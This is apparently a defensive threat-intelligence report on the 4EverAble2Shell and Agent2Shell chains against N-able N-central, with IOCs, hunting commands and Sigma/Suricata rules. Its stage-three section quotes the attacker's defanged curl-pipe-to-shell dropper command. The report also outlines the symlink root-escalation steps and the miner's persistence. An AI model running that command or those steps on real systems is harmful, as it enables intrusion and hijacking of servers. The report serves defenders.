# Technical Analysis Report: N-able N-central 4EverAble2Shell & Agent2Shell Zero-Day Exploitation (2026-11-14)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-11-14
Version: 0.1 (DRAFT)

## Executive Summary

Two new zero-day exploit chains dubbed **4EverAble2Shell** and **Agent2Shell** have been disclosed against N-able N-central, a widely deployed remote monitoring and management (RMM) platform. 4EverAble2Shell chains a critical Apache Axis SOAP fault class-instantiation vulnerability (CVE-2026-90436, CVSS 9.8) with a local privilege escalation flaw in N-central's maintenance helper scripts (tracked by Previdian as VULN-2026-0009, no CVE assigned) to achieve **unauthenticated remote code execution as root** on N-central appliances. Agent2Shell chains over 10 zero-day vulnerabilities in N-central's agent communication to achieve **NT AUTHORITY\SYSTEM** execution on managed Windows endpoints. Both exploit chains work against fully patched servers running N-central 2026.4.1.26 (Hotfix 2, released November 10, 2026). Both require the **Legacy API to be enabled** -- a non-default configuration.

Active exploitation of 4EverAble2Shell was observed within approximately 5 hours of the PoC publication on November 12, 2026. Huntback identified 21 compromised N-central production servers (19 running HF2) across the US, Canada, South Africa, the UK, Germany, France, and Sweden, all running XMRig Monero cryptocurrency miners. The attacker's wallet shows 631 total rigs across multiple exploited products, suggesting an opportunistic, multi-exploit cryptomining operation.

No patch is currently available for 4EverAble2Shell or Agent2Shell. The primary mitigation is to **disable the Legacy API immediately** and restrict internet exposure of N-central instances.

## Background: N-able N-central

N-able N-central is an on-premises and hosted remote monitoring and management (RMM) platform used extensively by managed service providers (MSPs) to manage customer IT infrastructure. It provides agent-based management of Windows, macOS, and Linux endpoints, along with probe-based network monitoring. N-central includes a SOAP-based "Legacy API" for programmatic access, which is disabled by default but may be enabled by organizations for integration purposes. The platform's position as an MSP tool means a compromised N-central server can provide access to all managed customer environments, amplifying the impact of any server-level compromise significantly.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-11-06 | CVE-2026-90436 (Apache Axis SOAP fault class instantiation) disclosed; patch commit published |
| 2026-11-09 | Researcher Sean Bales publicly discloses Able2Shell (33 critical N-central vulnerabilities); N-able takes hosted N-central offline |
| 2026-11-10 | N-able releases N-central 2026.4.1.26 (Hotfix 2), patching seven CVEs from the original Able2Shell set |
| 2026-11-12 03:58 | Sean Bales publishes 4EverAble2Shell and Agent2Shell PoC exploits to GitHub |
| 2026-11-12 07:48 | PoC repository updated noting Legacy API requirement |
| 2026-11-12 08:24 | Previdian sensors record first exploitation attempts |
| 2026-11-12 08:30 | Huntback observes initial probes from 157.20.241[.]16 (User-Agent: `Mozilla/5.0`) |
| 2026-11-12 09:16 | First full exploit chain attempt captured by Huntback honeypots (User-Agent: `python-requests/2.31.0`) |
| 2026-11-12 09:36-10:09 | Multiple additional exploit chain attempts with callback ports 19202-19418 |
| 2026-11-12 12:50 | Huntback identifies 21 active `nc_` miners in the attacker's mining pool |
| 2026-11-13 | N-able publishes IOCs and confirms Agent2Shell also requires the Legacy API |

## Root Cause Analysis

### Stage 1: Apache Axis SOAP Fault Class Instantiation (CVE-2026-90436)

The vulnerability exists in Apache Axis 1.x (all versions through 1.4, end-of-life), which is bundled with N-central for its Legacy SOAP API. When a SOAP fault includes an `exceptionName` element, the Axis engine loads the named Java class and, if a `data` element is also present, instantiates it through its String constructor **before** validating that it is an `AxisFault` subclass. Critically, this parsing occurs during service resolution, **before any per-service authentication handlers execute**, so authentication configured on a service does not protect against it.

In the 4EverAble2Shell chain, the attacker specifies `jline.internal.TerminalLineSettings` as the exception class. This JLine class is present on the N-central classpath and executes a shell command from its String constructor to detect terminal settings. By crafting the `data` field, the attacker achieves command execution as the `nable` service account.

The exploit targets the endpoint `POST /dms/services/ServerUI` with a crafted SOAP fault body.

### Stage 2: Local Privilege Escalation to Root (VULN-2026-0009)

A Python script (SHA-256: `fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747`) abuses N-central's privileged maintenance helper `nable_wrapper.pl` (invoked via sudo) to escalate from `nable` to root:

1. Backs up `/opt/nable/var/ncsai/scripts/ServerChild.sh`
2. Creates a symlink at `/var/opt/n-central/flag/flag_default.json` pointing to `ServerChild.sh`
3. Calls the `setLDFileOwner` helper, which follows the symlink and changes ownership of `ServerChild.sh` to `nable`
4. Rewrites `ServerChild.sh` to execute attacker commands
5. Triggers execution via the `serverControl` function, which runs the script as root
6. Restores the original file, ownership, symlink, and backup to reduce forensic evidence
7. Writes status markers (`write_before`, `write_after`, `helper_restored`) back to the operator

### Stage 3: Post-Exploitation Payload Delivery

The root command remounts `/tmp` with exec permissions (`mount -o remount,exec /tmp`), then downloads and executes the `jup.sh` dropper script:

```
curl hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_<target-ip>
```

### Agent2Shell (Windows Endpoint Exploitation)

Agent2Shell chains more than 10 zero-day vulnerabilities in how the N-central server communicates with Windows Agents and Probes. Two chains allow an unauthenticated attacker who can reach the server to execute commands on managed Windows endpoints as **NT AUTHORITY\SYSTEM**. The attacker must know the target appliance ID. No exploitation of Agent2Shell has been reported as of November 14, but IP allowlisting alone is insufficient mitigation because the affected endpoints are the same ones agents and probes use to check in.

Agent2Shell indicators on Windows endpoints include:
- `powershell.exe -NoProfile -NonInteractive -EncodedCommand` running as SYSTEM, spawned from the N-able Agent
- `wsp.exe` or `service.cfg` written to `Windows Software Probe\bin`
- `taskkill /f /im wsp.exe` and service restarts from `%TEMP%` `.cmd` files
- ZIP files under `/download/scheduled_tasks/output_files/` containing `CodeDropMeta.xml`

## Technical Analysis of the Cryptomining Payload

### Miner Dropper: `jup.sh`

The dropper performs the following actions:

1. **Working directory setup:** Creates `/tmp/.xvd/` (preferred) or `/var/tmp/.xvd/` if `/tmp` is unusable. Remounts `/tmp` as executable when run as root.

2. **Binary download:** Attempts to download the miner binary from `157.20.241[.]16:8080` in order of preference:
   - `/xvgz` (gzip-compressed custom binary)
   - `/xmrig.tgz` (stock XMRig 6.26.0)
   - Uses `curl`, `wget`, or Python (whichever is available)

3. **Resource throttling:**
   - Uses half the available CPU cores, capped at 8
   - Passes `--cpu-max-threads-hint 50`
   - If free memory is below ~2.5 GB, switches RandomX to light mode on at most 2 threads

4. **Mining pool configuration:**
   - Primary pool: `139.99.69[.]109:10128`
   - Fallback pool: `79.76.51[.]56:39100` (used if primary unresponsive after 6 seconds)
   - Wallet: `41wx2Pv3FzfRvX11jQgzM4bRbgvr6GViRXCKkHhXhLVQ64mgUR5ks4CEzHx8zqUJ8MgsWwTaWiS3uiZbCgJQnNXoB19mGtr`
   - Rig ID: `nc_<victim-ip>` (dots replaced with dashes)
   - Flags: `--donate-level 1`

5. **Persistence:** A `keep.sh` watchdog relaunches the miner every 10 minutes. Installed via (in order of preference):
   - systemd unit: `/etc/systemd/system/xvd.service`
   - User crontab entry tagged `# xvkeep`
   - System cron file: `/etc/cron.d/xvd`

6. **Beacons (HTTP to 157.20.241[.]16:8080):**
   - Startup: `/ob/cronhit?h=jup_start_<rig>&persist=<method>`
   - Health check: `/ob/fcheck` with miner PID, core count, thread count, free memory, persistence method, and miner log tail

### Campaign Scale

At 12:50 UTC on November 12, the attacker's wallet listed 631 rigs producing approximately 255 kH/s. The 21 N-central rigs (`nc_` prefix) contributed about 25 kH/s. Other rig name prefixes indicate additional exploited products:
- `jpom_` (39 rigs) -- Jpom deployment platform
- `fpbx_` (12 rigs) -- FreePBX
- `mlflow_` (10 rigs) -- MLflow
- `flink_` (5 rigs) -- Apache Flink
- `papercut_` (2 rigs) -- PaperCut
- `sftpgo_` (2 rigs) -- SFTPGo
- `ajreport_` (2 rigs) -- AJ-Report
- 170+ `<ip>_3000` rigs -- unknown product on port 3000

This is an opportunistic, multi-exploit cryptomining operator, not an APT group.

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxp://` (e.g., `hxxp://evil[.]com/payload`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### Network Indicators

| Type | Value | Context |
|------|-------|---------|
| IP | `157.20.241[.]16` | Exploitation source, payload host (port 8080), callback listener (TCP 19202-19418) |
| IP:Port | `139.99.69[.]109:10128` | Primary Monero mining pool |
| IP:Port | `79.76.51[.]56:39100` | Fallback Monero mining pool |
| URL | `hxxp://157.20.241[.]16:8080/jup.sh` | Miner dropper script |
| URL | `hxxp://157.20.241[.]16:8080/xvgz` | Miner binary (gzip-compressed) |
| URL | `hxxp://157.20.241[.]16:8080/xmrig.tgz` | XMRig 6.26.0 fallback download |
| URL | `hxxp://157.20.241[.]16:8080/ob/cronhit` | Startup beacon |
| URL | `hxxp://157.20.241[.]16:8080/ob/fcheck` | Health check beacon |
| Wallet | `41wx2Pv3FzfRvX11jQgzM4bRbgvr6GViRXCKkHhXhLVQ64mgUR5ks4CEzHx8zqUJ8MgsWwTaWiS3uiZbCgJQnNXoB19mGtr` | Monero wallet address |

### Web / API Indicators

| Type | Value | Context |
|------|-------|---------|
| URI Path | `/dms/services/ServerUI` | Targeted Apache Axis endpoint (POST) |
| SOAP Element | `exceptionName` containing `jline.internal.TerminalLineSettings` | Exploit trigger in SOAP fault body |
| User-Agent | `python-requests/2.31.0` | Weaponized exploit requests |
| User-Agent | `Mozilla/5.0` | Initial probe requests |
| URI Path | `/dms/services/ServerUI` with `GenericAgentXMPPMessageExchange` and SessionID -1 | Agent2Shell indicator |
| URI Path | `/dms2/services2/ServerMMS2` with `RemoteExecutionTaskSubmit` and sessionID -1 | Agent2Shell indicator |

### File System Indicators

| Platform | Path / Artifact | Hash (SHA-256) | Description |
|----------|-----------------|----------------|-------------|
| Linux | `/tmp/.xvd/` | N/A | Miner working directory |
| Linux | `/var/tmp/.xvd/` | N/A | Alternate miner working directory |
| Linux | `/tmp/.xvd/x` | N/A | Miner binary |
| Linux | `/tmp/.xvd/keep.sh` | N/A | Watchdog script |
| Linux | `/tmp/.xvd/xm.log` | N/A | Miner log file |
| Linux | `jup.sh` | N/A | Dropper script |
| Linux | Privilege escalation script | `fc4c01fd11bc301cf312830460cfdccc3af9dcfe50c910b86d6a1117bc76c747` | Python script for nable-to-root escalation |
| Linux | `/var/opt/n-central/tmp/serverchild-*.bak` | N/A | ServerChild.sh backup (escalation artifact) |
| Linux | `/var/opt/n-central/tmp/serverchild-*.sh` | N/A | Modified script (escalation artifact) |
| Linux | `/var/opt/n-central/tmp/serverchild-*.out` | N/A | Command output (escalation artifact) |
| Linux | `/var/opt/n-central/flag/flag_default.json` (symlink) | N/A | Symlink to ServerChild.sh (escalation artifact) |
| Linux | `/opt/nable/var/ncsai/scripts/ServerChild.sh` | N/A | Target of ownership change (modified then restored) |

### Persistence Indicators

| Type | Indicator | Description |
|------|-----------|-------------|
| systemd | `/etc/systemd/system/xvd.service` | Miner persistence unit |
| cron | `/etc/cron.d/xvd` | System cron persistence |
| crontab | Entry tagged `# xvkeep` | User crontab persistence |

### Process Indicators

| Indicator | Description |
|-----------|-------------|
| Command line containing `--rig-id nc_` | XMRig miner with N-central campaign rig naming |
| Command line containing `--donate-level 1` | XMRig miner donate-level flag |
| Binary `x` executing from `.xvd` directory | Renamed miner binary |
| `mount -o remount,exec /tmp` | Enabling execution in /tmp for miner deployment |

### Agent2Shell Endpoint Indicators (Windows)

| Indicator | Description |
|-----------|-------------|
| `powershell.exe -NoProfile -NonInteractive -EncodedCommand` as SYSTEM from N-able Agent | Possible Agent2Shell exploitation |
| `wsp.exe` or `service.cfg` in `Windows Software Probe\bin` | Probe binary replacement |
| `CodeDrop\ServiceBackup\wsp.exe` | Probe backup during exploitation |
| `taskkill /f /im wsp.exe` from `%TEMP%` `.cmd` file | Service manipulation during exploitation |
| ZIPs with `CodeDropMeta.xml` under `/download/scheduled_tasks/output_files/` | Task output artifacts |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | Exploitation of N-central Legacy API via Apache Axis SOAP fault (CVE-2026-90436) |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Shell commands executed via JLine class instantiation and dropper script |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Agent2Shell encoded PowerShell execution as SYSTEM (reported, not observed in the wild) |
| T1068 | Exploitation for Privilege Escalation | Abuse of N-central setLDFileOwner helper and symlink for nable-to-root escalation |
| T1548 | Abuse Elevation Control Mechanism | Leveraging sudo-accessible nable_wrapper.pl for root execution |
| T1105 | Ingress Tool Transfer | Download of jup.sh dropper and XMRig binary from 157.20.241[.]16 |
| T1222.002 | File and Directory Permissions Modification: Linux and Mac | Remounting /tmp with exec permissions |
| T1543.002 | Create or Modify System Process: Systemd Service | xvd.service persistence |
| T1053.003 | Scheduled Task/Job: Cron | Cron-based miner persistence via /etc/cron.d/xvd and xvkeep crontab |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | Hidden .xvd working directories |
| T1496 | Resource Hijacking | XMRig Monero cryptocurrency mining |
| T1070 | Indicator Removal | Restoring ServerChild.sh, removing symlinks and backups after escalation |

## Impact Assessment

- **Breadth:** All on-premises N-central installations with the Legacy API enabled and exposed to the internet are vulnerable, including those running the latest Hotfix 2. N-able states the Legacy API is disabled by default. Hosted N-central environments are not affected by the server-side issue.
- **Depth:** Complete appliance compromise -- unauthenticated RCE as root on the N-central server. As an RMM platform, a compromised N-central server provides potential access to all managed customer endpoints, including the ability to deploy arbitrary code to those endpoints via Agent2Shell.
- **Stealth:** The attacker restores modified files and removes escalation artifacts after exploitation. The miner uses only half the CPU cores to avoid detection. The dropper uses a hidden directory name (`.xvd`).
- **Exploitation Status:** Active exploitation confirmed. 21 production servers compromised as of November 12, 2026. PoC publicly available. The attacker is an opportunistic cryptomining operator exploiting multiple products.
- **Agent2Shell:** No confirmed exploitation as of November 14, but the capability to pivot from server to all managed endpoints makes this extremely high-impact.

## Detection & Remediation

### Immediate Detection

1. **Search web server/reverse proxy logs** for exploitation indicators:
   ```
   grep -i "ServerUI" /var/opt/n-central/log/access*.log
   grep -i "jline.internal.TerminalLineSettings" /var/opt/n-central/log/*.log
   grep -i "python-requests" /var/opt/n-central/log/access*.log
   ```

2. **Hunt for miner artifacts on N-central hosts:**
   ```
   ls -la /tmp/.xvd/ /var/tmp/.xvd/ 2>/dev/null
   systemctl status xvd.service 2>/dev/null
   cat /etc/cron.d/xvd 2>/dev/null
   crontab -l -u nable 2>/dev/null | grep xvkeep
   ps aux | grep -E '(rig-id|donate-level|\.xvd)'
   ```

3. **Hunt for privilege escalation artifacts:**
   ```
   ls -la /var/opt/n-central/tmp/serverchild-* 2>/dev/null
   ls -la /var/opt/n-central/flag/flag_default.json 2>/dev/null
   file /var/opt/n-central/flag/flag_default.json 2>/dev/null
   ```

4. **Check outbound connections:**
   ```
   ss -tnp | grep -E '(157\.20\.241\.16|139\.99\.69\.109|79\.76\.51\.56)'
   ```

5. **Review Windows endpoints** (if Agent2Shell is a concern):
   - Check for encoded PowerShell execution as SYSTEM spawned by the N-able Agent since November 11, 2026
   - Review for changes to Windows Software Probe binaries and service restarts
   - Audit for new administrative accounts created since November 8, 2026

### Remediation

1. **Immediate:** Disable the Legacy API on all N-central instances. This is the primary mitigation and eliminates the attack vector for both 4EverAble2Shell and Agent2Shell.
2. **If Legacy API was enabled and internet-exposed:** Treat the server as potentially compromised. Isolate, preserve logs and disk images, and engage incident response. Rebuild from a known-good install.
3. **Network controls:** Remove N-central from direct internet exposure. Place SOAP and web endpoints behind a VPN. IP allowlisting alone is insufficient for Agent2Shell.
4. **Apply Hotfix 2** and upgrade all Agents and Probes to 2026.4 HF1 or later (for the earlier Able2Shell fixes).
5. **Rotate all credentials** stored in or used by N-central if compromise is suspected.
6. **Monitor managed endpoints** for new accounts, scheduled tasks, scripts, and remote sessions since November 11, 2026.

### Long-Term Hardening

- Never expose the N-central Legacy API to the public internet
- Place all RMM management interfaces behind VPN or zero-trust network access
- Implement network monitoring for SOAP-fault POST requests to `/dms/services/ServerUI`
- Monitor for cryptomining indicators (high CPU usage, mining pool connections, XMRig process signatures)
- Subscribe to N-able security advisories and Previdian KEV catalog updates

## Detection Rules

These detections target the specific exploit chain, post-exploitation payload, and infrastructure observed in the 4EverAble2Shell campaign. Compiles does not equal fires -- verify in your pipeline with representative log data.

### Sigma: N-central 4EverAble2Shell Apache Axis SOAP Fault Exploitation (CVE-2026-90436)
Detects HTTP POST requests to the vulnerable `/dms/services/ServerUI` endpoint characteristic of CVE-2026-90436 exploitation.
**Status:** compile: pass (splunk, log_scale) | confidence: medium
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. sigma check blocked by proxy (MITRE ATT&CK data fetch 403). Keys on the specific Axis endpoint path — distinctive to N-central SOAP API, but URI-only match has inherent FP surface from legitimate Legacy API traffic. -->
```yaml
title: N-central 4EverAble2Shell Apache Axis SOAP Fault Exploitation (CVE-2026-90436)
id: a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d
status: experimental
description: >
    Detects HTTP POST requests to the N-central Apache Axis endpoint
    /dms/services/ServerUI containing SOAP fault payloads referencing
    jline.internal.TerminalLineSettings, indicative of CVE-2026-90436
    exploitation in the 4EverAble2Shell attack chain.
references:
    - https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://previdian.com/VULN-2026-0009
author: Actioner
date: 2026-11-14
tags:
    - attack.t1190
    - attack.t1059.004
    - cve.2026.90436
logsource:
    category: webserver
detection:
    selection_method:
        cs-method: 'POST'
    selection_uri:
        cs-uri-stem|contains: '/dms/services/ServerUI'
    condition: selection_method and selection_uri
falsepositives:
    - Legitimate N-central SOAP API traffic to the ServerUI endpoint from authorized management systems
level: medium
```

### Sigma: N-central 4EverAble2Shell XMRig Miner Persistence via Systemd or Cron
Detects creation of the `xvd.service` systemd unit or `/etc/cron.d/xvd` cron job used for miner persistence.
**Status:** compile: pass (splunk, log_scale) | confidence: high
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. xvd.service and /etc/cron.d/xvd are not associated with any legitimate software. -->
```yaml
title: N-central 4EverAble2Shell XMRig Miner Persistence via Systemd or Cron
id: b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e
status: experimental
description: >
    Detects creation of the xvd.service systemd unit or xvd cron job
    used for XMRig cryptominer persistence following 4EverAble2Shell
    exploitation of N-able N-central servers.
references:
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/
author: Actioner
date: 2026-11-14
tags:
    - attack.t1543.002
    - attack.t1053.003
    - attack.t1496
logsource:
    category: file_event
    product: linux
detection:
    selection_systemd:
        TargetFilename|endswith: '/xvd.service'
    selection_crond:
        TargetFilename: '/etc/cron.d/xvd'
    condition: selection_systemd or selection_crond
falsepositives:
    - Unlikely - xvd.service and /etc/cron.d/xvd are not associated with legitimate software
level: high
```

### Sigma: N-central 4EverAble2Shell XMRig Miner Working Directory Creation
Detects file creation within the hidden `.xvd` directories used by the miner.
**Status:** compile: pass (splunk, log_scale) | confidence: high
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. .xvd is not a standard directory name. -->
```yaml
title: N-central 4EverAble2Shell XMRig Miner Working Directory Creation
id: c3d4e5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: >
    Detects file creation or process execution within the hidden .xvd
    directories used by the XMRig cryptocurrency miner deployed through
    the 4EverAble2Shell N-central exploit chain.
references:
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/
author: Actioner
date: 2026-11-14
tags:
    - attack.t1564.001
    - attack.t1496
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|contains:
            - '/tmp/.xvd/'
            - '/var/tmp/.xvd/'
    condition: selection
falsepositives:
    - Unlikely - .xvd is not a standard directory name for legitimate software
level: high
```

### Sigma: N-central 4EverAble2Shell XMRig Miner Process Execution
Detects XMRig processes with the campaign-specific `nc_` rig-id prefix or binary path.
**Status:** compile: pass (splunk, log_scale) | confidence: high
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. --rig-id nc_ is campaign-specific; .xvd/x binary path is unique to this payload. -->
```yaml
title: N-central 4EverAble2Shell XMRig Miner Process Execution
id: d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f80
status: experimental
description: >
    Detects XMRig cryptocurrency miner processes with the nc_ rig-id
    prefix or donate-level argument characteristic of the 4EverAble2Shell
    post-exploitation payload on compromised N-central servers.
references:
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/
author: Actioner
date: 2026-11-14
tags:
    - attack.t1496
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection_rigid:
        CommandLine|contains: '--rig-id nc_'
    selection_donate:
        CommandLine|contains: '--donate-level 1'
    selection_binary:
        Image|endswith: '/.xvd/x'
    condition: selection_rigid or selection_donate or selection_binary
falsepositives:
    - Legitimate XMRig usage with a rig-id starting with nc_ (unlikely in enterprise environments)
level: critical
```

### Sigma: N-central 4EverAble2Shell Privilege Escalation Artifacts
Detects file system artifacts from the privilege escalation chain.
**Status:** compile: pass (splunk, log_scale) | confidence: high
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. serverchild-* in the N-central tmp directory and the flag_default.json symlink are specific to the exploit chain. -->
```yaml
title: N-central 4EverAble2Shell Privilege Escalation Artifacts
id: e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8091
status: experimental
description: >
    Detects file system artifacts from the 4EverAble2Shell privilege
    escalation chain, including ServerChild.sh backup files, symlinks
    to flag_default.json, and escalation output files in the N-central
    temporary directory.
references:
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://malware.news/t/4everable2shell-at-a-glance/127283
author: Actioner
date: 2026-11-14
tags:
    - attack.t1068
    - attack.t1548
logsource:
    category: file_event
    product: linux
detection:
    selection_backup:
        TargetFilename|contains: '/var/opt/n-central/tmp/serverchild-'
    selection_symlink:
        TargetFilename: '/var/opt/n-central/flag/flag_default.json'
    condition: selection_backup or selection_symlink
falsepositives:
    - N-central maintenance operations may create files in /var/opt/n-central/tmp/ but the serverchild- prefix with hex suffix is specific to the exploit
level: high
```

### Sigma: N-central 4EverAble2Shell Outbound Connection to Known C2 Infrastructure
Detects outbound connections to known 4EverAble2Shell infrastructure.
**Status:** compile: pass (splunk, log_scale) | confidence: critical
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. IOC-based rule with high specificity. IPs are confirmed attacker infrastructure. -->
```yaml
title: N-central 4EverAble2Shell Outbound Connection to Known C2 Infrastructure
id: f6a7b8c9-d0e1-4f2a-3b4c-5d6e7f809102
status: experimental
description: >
    Detects outbound network connections from N-central servers to
    known 4EverAble2Shell infrastructure including the payload server,
    primary mining pool, and fallback mining pool.
references:
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://www.huntress.com/blog/n-able-disables-cloud-services-following-disclosure-of-able2shell-exploit-chains
author: Actioner
date: 2026-11-14
tags:
    - attack.t1071
    - attack.t1496
logsource:
    category: firewall
detection:
    selection_payload_server:
        dst_ip: '157.20.241.16'
    selection_pool_primary:
        dst_ip: '139.99.69.109'
        dst_port: 10128
    selection_pool_fallback:
        dst_ip: '79.76.51.56'
        dst_port: 39100
    condition: selection_payload_server or selection_pool_primary or selection_pool_fallback
falsepositives:
    - Unlikely for the specific IP and port combinations
level: critical
```

### Sigma: N-central Agent2Shell Suspicious Encoded PowerShell from N-able Agent
Detects encoded PowerShell as SYSTEM spawned by the N-able Agent, a potential Agent2Shell indicator.
**Status:** compile: pass (splunk, log_scale) | confidence: low
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. N-able agents legitimately use encoded PowerShell -- this rule requires significant baselining and tuning. Included as a hunting lead, not a production detection. -->
```yaml
title: N-central Agent2Shell Suspicious Encoded PowerShell from N-able Agent
id: 07b8c9d0-e1f2-4a3b-4c5d-6e7f80910213
status: experimental
description: >
    Detects encoded PowerShell commands running as SYSTEM that are spawned
    by the N-able Agent process, which may indicate Agent2Shell exploitation.
    Note that N-able agents legitimately use encoded PowerShell, so this
    rule requires tuning based on baseline behavior.
references:
    - https://www.huntress.com/blog/n-able-disables-cloud-services-following-disclosure-of-able2shell-exploit-chains
    - https://thehackernews.com/2026/11/new-n-central-exploits-work-against.html
author: Actioner
date: 2026-11-14
tags:
    - attack.t1059.001
    - attack.t1569.002
logsource:
    category: process_creation
    product: windows
detection:
    selection_powershell:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains|all:
            - '-EncodedCommand'
            - '-NoProfile'
            - '-NonInteractive'
        User: 'NT AUTHORITY\SYSTEM'
    selection_parent:
        ParentImage|contains: 'N-able'
    condition: selection_powershell and selection_parent
falsepositives:
    - Legitimate N-able Agent encoded PowerShell operations - requires baselining
level: medium
```

### Sigma: N-central 4EverAble2Shell Remount /tmp with Exec Permissions
Detects remounting /tmp with exec permissions, used to enable miner execution.
**Status:** compile: pass (splunk, log_scale) | confidence: medium
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. mount remount exec /tmp is a legitimate admin operation, but on N-central servers it is suspicious. -->
```yaml
title: N-central 4EverAble2Shell Remount tmp with Exec Permissions
id: 18c9d0e1-f2a3-4b4c-5d6e-7f8091021324
status: experimental
description: >
    Detects remounting /tmp with exec permissions, a technique used in
    the 4EverAble2Shell exploit chain to enable execution of the XMRig
    miner binary downloaded to /tmp.
references:
    - https://huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers
    - https://thehackernews.com/2026/11/hackers-exploit-n-central-flaws-to.html
author: Actioner
date: 2026-11-14
tags:
    - attack.t1222.002
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains|all:
            - 'mount'
            - 'remount'
            - 'exec'
            - '/tmp'
    condition: selection
falsepositives:
    - System administrators legitimately remounting /tmp with exec for maintenance
level: high
```

### Suricata: N-central 4EverAble2Shell SOAP Fault Exploitation (CVE-2026-90436)
Detects POST requests to `/dms/services/ServerUI` with the `jline.internal.TerminalLineSettings` class in the body.
**Status:** compile: uncompiled (structural check only) | confidence: high
<!-- audit: suricata not installed; structural check passed -- semicolons terminate all options, http.* sticky buffers used, balanced parentheses, msg/sid/rev present, fast_pattern set. -->
```suricata
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - N-central 4EverAble2Shell SOAP Fault Exploitation Attempt (CVE-2026-90436)"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/dms/services/ServerUI"; fast_pattern; http.request_body; content:"jline.internal.TerminalLineSettings"; classtype:web-application-attack; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; reference:cve,2026-90436; metadata:author Actioner, created_at 2026-11-14; sid:2200101; rev:1;)
```

### Suricata: N-central 4EverAble2Shell python-requests Probe
Detects POST requests to `/dms/services/ServerUI` with the observed `python-requests/2.31.0` User-Agent.
**Status:** compile: uncompiled (structural check only) | confidence: high
<!-- audit: structural check passed. -->
```suricata
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - N-central 4EverAble2Shell SOAP Fault Probe via python-requests"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/dms/services/ServerUI"; http.user_agent; content:"python-requests/2.31.0"; fast_pattern; classtype:web-application-attack; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; reference:cve,2026-90436; metadata:author Actioner, created_at 2026-11-14; sid:2200102; rev:1;)
```

### Suricata: N-central 4EverAble2Shell Miner Dropper Download
Detects HTTP GET request for `jup.sh` dropper from the known payload server.
**Status:** compile: uncompiled (structural check only) | confidence: high
<!-- audit: structural check passed. -->
```suricata
alert http $HOME_NET any -> any any (msg:"Actioner - N-central 4EverAble2Shell Miner Dropper Download from Payload Server"; flow:established,to_server; http.uri; content:"/jup.sh"; fast_pattern; content:"157.20.241.16"; http.host; classtype:trojan-activity; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; metadata:author Actioner, created_at 2026-11-14; sid:2200103; rev:1;)
```

### Suricata: N-central 4EverAble2Shell Primary Mining Pool Connection
Detects TCP connections to the primary mining pool.
**Status:** compile: uncompiled (structural check only) | confidence: critical
<!-- audit: structural check passed. IOC-based rule. -->
```suricata
alert tcp $HOME_NET any -> 139.99.69.109 10128 (msg:"Actioner - N-central 4EverAble2Shell Primary Mining Pool Connection"; flow:established,to_server; classtype:trojan-activity; reference:url,huntback.io/blog/ncentral-4everable2shell-miners-on-live-servers; metadata:author Actioner, created_at 2026-11-14; sid:2200104; rev:1;)
```

### Suricata: N-central 4EverAble2Shell Fallback Mining Pool Connection
Detects TCP connections to the fallback mining pool.
**Status:** compile: uncompiled (structural check only) | confidence: critical
<!-- audit: structural check passed. IOC-based rule. -->
```suricata
